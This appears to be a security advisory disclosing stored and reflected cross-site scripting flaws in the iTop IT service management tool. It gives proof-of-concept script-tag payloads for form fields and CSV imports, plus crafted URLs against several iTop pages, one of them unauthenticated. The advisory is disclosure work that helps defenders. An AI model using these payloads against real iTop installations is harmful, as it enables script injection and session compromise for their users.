Summary:
    "IT Operations Portal: a complete open source, ITIL, web based 
    service management tool including a fully customizable CMDB, 
    a helpdesk system and a document management tool."
    Several common flaws could be found in iTop like reflected
    and stored XSS.


Vulnerable Scripts:
    stored XSS:
     - almost every tested input field stored in database and in the
html-content of the site. 
	   Especially in case data is reformatted using Javascript, the
sanitisation in place 
	   seems to be overridden.

    reflected XSS:
     - almost every test input field where the value is reflected in
servers output

Examples:
    stored XSS:
      - add a company named "XSS <script>alert("Help Me")</script>"
      - add a database server named "XSS <script>alert("Help
Me")</script>"
      - import a CSV-File where one cell contains "XSS <script>alert("Help
Me")</script>"
      - copy&paste data (which does the same as CSV-import) using
        1;Test 1
        2;Test 2
        3;Test 3<script>alert("23746234243 Test")</script>"

    reflected XSS (un-authenticated):
 
http://$domain/iTop/pages/UI.php?auth_user=admin"><script>alert("Help
Me")</script><lala="&suggest_pwd=admin

    reflected XSS (authenticated):
 
http://$domain/iTop/pages/UI.php?auth_user=admin"><script>alert("Help
Me")</script><lala="&suggest_pwd=admin
 
http://$domain/iTop/pages/UniversalSearch.php?c[menu]="<script>alert("Help
Me")</script>"
 
http://$domain/iTop/pages/UI.php?c%5bmenu%5d=60&class=Note&currentId=Searc
hFormToAdd_document_list \
        &description="<script>alert("Help
Me")</script>"&dosearch=1&name=Acunetix&open=1&operation=search \
        _form&org_id=3&status=draft&type=contract
 
http://domain/iTop/pages/audit.php?category=%22%3Cscript%3Ealert%281%29%3C
